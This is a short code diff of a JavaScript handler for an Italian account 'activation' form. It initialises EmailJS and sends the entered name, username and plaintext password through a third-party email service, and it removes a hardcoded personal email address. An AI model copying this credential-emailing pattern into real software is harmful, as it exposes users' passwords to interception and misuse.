@@ -1,4 +1,7 @@
 document.addEventListener('DOMContentLoaded', () => {
+  // Inizializza EmailJS (v4)
+  emailjs.init("5dTLT6bmdof0m4HBr");
+
   const form = document.getElementById('activation-form');
   const nome = document.getElementById('nome');
   const cognome = document.getElementById('cognome');
@@ -28,13 +31,13 @@ document.addEventListener('DOMContentLoaded', () => {
       return;
     }
 
+    // Prepara i dati da inviare
     const dati = {
       nome: nome.value,
       cognome: cognome.value,
       username: username.value,
       password: password,
-      plan: "Starter",
-      email: "santosuossosimone8@gmail.com" // Email impostata direttamente nello script
+      plan: "Starter"
     };
 
     emailjs.send('service_chih3ur', 'template_c5slxmt', dati)
